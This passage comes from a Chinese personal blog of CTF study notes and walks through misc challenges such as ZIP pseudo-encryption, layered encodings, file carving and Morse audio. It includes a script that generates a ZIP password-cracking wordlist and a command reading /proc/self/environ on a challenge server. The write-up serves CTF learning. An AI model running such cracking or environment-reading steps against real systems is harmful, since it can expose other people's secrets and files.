+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、第0~3个字节：50 4B 05 06，代表目录结束标记</span><br><span class="line"></span><br><span class="line">2、第4~5个字节：00 00，代表当前磁盘编号</span><br><span class="line"></span><br><span class="line">3、第6~7个字节：00 00，代表目录区开始磁盘编号</span><br><span class="line"></span><br><span class="line">4、第8~9个字节：01 00，代表本磁盘上纪录总数</span><br><span class="line"></span><br><span class="line">5、第10~11个字节：01 00，代表目录区中纪录总数</span><br><span class="line"></span><br><span class="line">6、第12~15个字节：62 00 00 00，代表目录区尺寸大小</span><br><span class="line"></span><br><span class="line">7、第16~19个字节：A5 00 00 00，代表目录区对第一张磁盘的偏移量</span><br><span class="line"></span><br><span class="line">8、第20~21个字节：00 00，代表zip文件注释长度</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断加密方式：</strong></p>
+<p>关键在于全局方式标记的第一字节数字的奇偶上，第一字节数字为偶数表示无加密，例如：00,02,04等；为奇数表示有加密，例如01,03,09等。</p>
+<p>**&#x3D;&#x3D;无加密&#x3D;&#x3D;**：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/ffc03579159262b026959d0f4ff05269.png" alt="img"></p>
+<p><strong>&#x3D;&#x3D;真加密：&#x3D;&#x3D;</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/43b5310077d9a52c2d6dc734e9f39f99.png" alt="img"></p>
+<p><strong>&#x3D;&#x3D;伪加密：&#x3D;&#x3D;</strong></p>
+<p>伪加密的zip压缩包<strong>压缩源文件数据区的全局加密为 00 00，且压缩源文件目录区的全局方式位标记为09 00或者01 00</strong>。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/74c2ea80107eacfef613a9ffd032ef3b.png" alt="img"></p>
+<p>不过解这道题的时候很奇怪，我用winhex和010打开都没发现伪加密的情况，该是09的地方是08，后来好几次尝试打开，又变了，但也不是09，如下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241021214658960.png" alt="image-20241021214658960"></p>
+<p>最后我将0A删去得到了flag</p>
+<p>flag{79ddfa61bda03defa7bfd8d702a656e4}</p>
+<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>软盘文件可以使用虚拟机打开，用虚拟机挂载后得到flag{ctfshow}</p>
+<h3 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h3><p>打开附件发现很多加密文件，只有misc1中的misc.png未加密，将图片解压发现图片上写着2020，将2020尝试输入doc文档，解密成功，得到一串音符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭‖♭‖‖♯♭♭♬‖♩♫‖♬∮♭♭¶♭‖♯‖¶♭♭‖∮‖‖♭‖§♭‖♬♪♭♯§‖‖♯‖‖♬‖‖♪‖‖♪‖¶§‖‖♬♭♯‖♭♯♪‖‖∮‖♬§♭‖‖‖♩♪‖‖♬♭♭♬‖♩♪‖♩¶‖♩♪‖♩♬‖¶§‖‖♩‖¶♫♭♭♩‖♬♯‖♬§♭‖♭‖♩¶‖‖∮♭♭♬‖‖♭‖♫§‖¶♫‖♩∮♭♭§‖♭§‖♭§§=</span><br></pre></td></tr></table></figure>
+
+<p>百度搜索[音符解密](<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn)</a>)进行解密，得到下列字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</span><br></pre></td></tr></table></figure>
+
+<p>由<strong>crypto6</strong>可知，**&#x3D;&#x3D;U2FsdGVkX1&#x3D;&#x3D;**开头的可能试试rabbit密码，于是尝试rabbit密码，密码为2020</p>
+<p>解密后得到密码<strong>welcome_to_payhelp</strong></p>
+<p>使用该密码解密hint.txt，得到一串字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</span><br></pre></td></tr></table></figure>
+
+<p>看着有点像base64，尝试用base64进行解密，解码6次后得到下列的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%217</span><br></pre></td></tr></table></figure>
+
+<p>看着这个**%20**就有点像url转码后的，所以尝试url解码，得到下面的字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome_to_2020</span><br><span class="line">flag is coming...</span><br><span class="line">the key is hello 2020!7</span><br></pre></td></tr></table></figure>
+
+<p>向flag.txt加密文件输入密码：**hello 2020!**后解密成功得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;g00d_f0r_y0u&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>解压附件后得到一张图片，查看属性没有提示，用010编辑器打开之后发现文件头是png，但是其中藏有PK(也就是藏了一个压缩包)</p>
+<p>将压缩包单独复制出来并保存，用010新建一个文件<strong>CTRL+shift+v</strong>粘贴进去然后保存成一个zip文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241023221220058.png" alt="image-20241023221220058"></p>
+<p>然后打开刚得到的压缩包，得到了一句提示<strong>GEZDGNBVGYFA&#x3D;&#x3D;&#x3D;&#x3D;<strong>，看见四个等号常常联想base32，于是用base32进行解码得到密码为</strong>123456</strong>，然后打开thienc文件，</p>
+<p>手动分离还是容易出错，看了大佬的wp才发现最后需要在分离出来的图片文件尾拿到隐写的后续压缩包密码，但是我手动分离图片容易出现问题，于是还是使用工具了，是在kali上用的<strong>foremost</strong></p>
+<p>使用语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost welcome.png</span><br></pre></td></tr></table></figure>
+
+<p>最后得到了一个png图片和一个压缩包，用010编辑器打开png图片最后在文件尾发现一串字符</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241023230051132.png" alt="image-20241023230051132"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</span><br></pre></td></tr></table></figure>
+
+<p>一眼base加密，解码一下，先进行一次base64解密，再进行一次base32解密，最后得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;Lazy_Man&#125;</span><br></pre></td></tr></table></figure>
+
+<p>thienc文件得到的内容如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241023230601304.png" alt="image-20241023230601304"></p>
+<p>可以发现<strong>3078</strong>反复出现，这里又知道了一个新的知识点，就是3078就是每两位16进制转字符后得到的0x</p>
+<p>这里我先在kali里用工具将3078全部转换成0x,代码如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/3078/0x/g&#x27; thienc.png</span><br></pre></td></tr></table></figure>
+
+<p>转换了之后使用[在线工具](<a target="_blank" rel="noopener" href="https://coding.tools/cn/hex-to-ascii">16进制到ASCII字符串在线转换工具 - Coding.Tools</a>)将16进制转换成字符,然后复制这串字符在010编辑器中新建文件并保存，这里还有一个知识点是关于<strong>7z文件</strong>，分析前几个字符串0x37 0x7a，<strong>37 7a 是7z压缩包的文件头</strong>。</p>
+<p>但是最后得到的7z压缩包打不开，最后还是采用大佬写的脚本(发现了很多问题最后还是ai的)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;thienc.txt&#x27;</span>)</span><br><span class="line">result = re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number)  <span class="comment"># 直接使用 re.findall，去掉多余的列表封装</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 遍历 result 列表，不再使用 tqdm</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = <span class="built_in">bytearray</span>.fromhex(i)</span><br><span class="line">    z = <span class="built_in">str</span>(y)</span><br><span class="line">    z = re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>, z)[<span class="number">0</span>]  <span class="comment"># 提取字符串部分</span></span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b = strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) == <span class="number">1</span>:</span><br><span class="line">        i = <span class="string">&#x27;0&#x27;</span> + i  <span class="comment"># 如果长度为1，则在前面加0</span></span><br><span class="line">    strings += i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果写入 te.txt 文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;te.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line">    <span class="comment">#该脚本的作用是将转字符串然后删去0x</span></span><br></pre></td></tr></table></figure>
+
+<p>唉，在采用大佬的脚本时总会遇到无相应外部库和与本地环境不匹配等问题，不会自己写脚本还真是寸步难行啊，看来有时间必须要去学习一下了</p>
+<p>最终终于得到了正确的结果，编辑进010编辑器然后保存成7z文件，再用之前得到的密码进行解密，文件终于打开了！</p>
+<p>文件的内容是base加密，base64和base32来来回回的加密，加密嫩多哈，用cyberchef进行解密</p>
+<p>最后得到的密文大概如下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241024220302898.png" alt="image-20241024220302898"></p>
+<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding </a></p>
+<p>先ook to txt，再brainfuck to txt</p>
+<p>最后得到flag：flag{Welc0me_tO_cTf_3how!}</p>
+<h2 id="Newstar-1"><a href="#Newstar-1" class="headerlink" title="Newstar"></a>Newstar</h2><h3 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h3><p>一步步解压，最后得到一个加密的zip压缩包和一个passwd_regex_hint的txt文件。这是密码提示来解密压缩包的题。<br>       txt里的内容为^([a-z]){3}\d[a-z]$，这是一个正则表达式，</p>
+<p>^和$表示表达式的开头和结尾，**([a-z]){3}表示3个小写字母，\d表示一个数字，[a-z]表示一个小写字母，所以这个密码的提示为：3个小写字母+一个数字+一个小写字母**</p>
+<p>于是以下脚本进行爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">zd1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">zd2 = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C://Users//Lenovo//Desktop//password.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="comment">#注意把路径改成自己文件的路径</span></span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> zd1 :</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> zd1 :</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> zd1 :</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> zd2 :</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> zd1 :</span><br><span class="line">                        password = i + j + z + m + n</span><br><span class="line">                        file.write(password)</span><br><span class="line">                        file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>再用字典进行爆破就行</p>
+<p>apchpr爆破太慢了，懒得破了，反正大概就是这个操作吧，</p>
+<h3 id="pleasingMusic"><a href="#pleasingMusic" class="headerlink" title="pleasingMusic"></a>pleasingMusic</h3><p>用audacity打开附件，发现后面的音频很明显的长短波，极有可能是摩斯密码，再根据题目提示将听到的摩斯密码逆序得到如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. --.. ..--.- -- --- .-. ... . ..--.- -.-. --- -.. .</span><br><span class="line"></span><br><span class="line">摩斯解码后得到flag：ez_morse_code</span><br></pre></td></tr></table></figure>
+
+<h3 id="WhereIsFlag"><a href="#WhereIsFlag" class="headerlink" title="WhereIsFlag"></a>WhereIsFlag</h3><p>直接用Linux来nc就行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls #查看当前目录下的文件</span><br><span class="line">cd #进入目录</span><br><span class="line">cd .. #返回上一目录</span><br><span class="line">cat #输出文件内容</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这道题我们首先<span class="built_in">ls</span>发现当前目录下还有很多个文件夹，直接挨个<span class="built_in">cd</span>查找提示，最后发现flag在 /proc/self/environ</span></span><br><span class="line">cat /proc/self/environ</span><br></pre></td></tr></table></figure>
+
+<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><p>直接用stegsolve打开</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241027160500647.png" alt="image-20241027160500647"></p>
+<p>一直翻页翻到一个二维码，扫描二维码拿到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://sarecter.github.io">Sarecter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://sarecter.github.io/2024/10/11/CTF_study/">http://sarecter.github.io/2024/10/11/CTF_study/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/imgs/008.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/10/28/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" title="hexo搭建博客遇到的问题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/imgs/017.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">hexo搭建博客遇到的问题</div></div><div class="info-2"><div class="info-item-1">关于hexo d部署成功但网页端未更新的解决方案诶，看了好多解决方法都没啥用，问题好像出在master和main分支上，但是我修改了之后反复确认也没解决（也不确定到底是不是这个理有问题了），最后还是找到了另一种方法部署和更新博客，以下示例方法仅供参考  博客文件夹下新建一个仓库文件夹，我的叫 blog_repository 在这个文件夹下打开git bash，输入如下内容（这里username请修改成你自己的名字）  1234git clone git@github.com:username/username.github.io.git .git branch --set-upstream-to=origin/main maingit pull origin maingit push origin main  这些命令完成之后你就会发现已经网页端更新了（以上内容仅供参考，如有错误欢迎大佬指正） </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/imgs/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Sarecter</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sarecter"><i></i><span>Follow me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sarecter" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow"><span class="toc-text">CTFshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto0"><span class="toc-text">crypto0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto2"><span class="toc-text">crypto2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto3"><span class="toc-text">crypto3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto4"><span class="toc-text">crypto4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rsa%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-text">rsa加解密原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-text">密钥生成过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto5"><span class="toc-text">crypto5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto6"><span class="toc-text">crypto6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto7"><span class="toc-text">crypto7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto8"><span class="toc-text">crypto8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto9"><span class="toc-text">crypto9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto10"><span class="toc-text">crypto10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto11"><span class="toc-text">crypto11</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-1"><span class="toc-text">CTFshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">web签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">sql注入漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">HTTP头注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E5%8D%8F%E8%AE%AE"><span class="toc-text">php协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4"><span class="toc-text">web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5"><span class="toc-text">web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6"><span class="toc-text">web6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web7"><span class="toc-text">web7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web8"><span class="toc-text">web8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web9"><span class="toc-text">web9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web10"><span class="toc-text">web10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web11"><span class="toc-text">web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web12"><span class="toc-text">web12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="toc-text">红包题第二弹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Newstar"><span class="toc-text">Newstar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#week1"><span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#headach3"><span class="toc-text">headach3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="toc-text">会赢吗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E6%A2%B0%E5%8D%B1%E6%9C%BA"><span class="toc-text">智械危机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%881%EF%BC%89"><span class="toc-text">PangBai 过家家（1）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-text">谢谢皮蛋</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2"><span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%B8%80%E7%A7%92%E5%86%85%E6%89%93%E5%87%BA%E5%85%AB%E5%8F%A5%E8%8B%B1%E6%96%87%E5%90%97"><span class="toc-text">你能在一秒内打出八句英文吗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 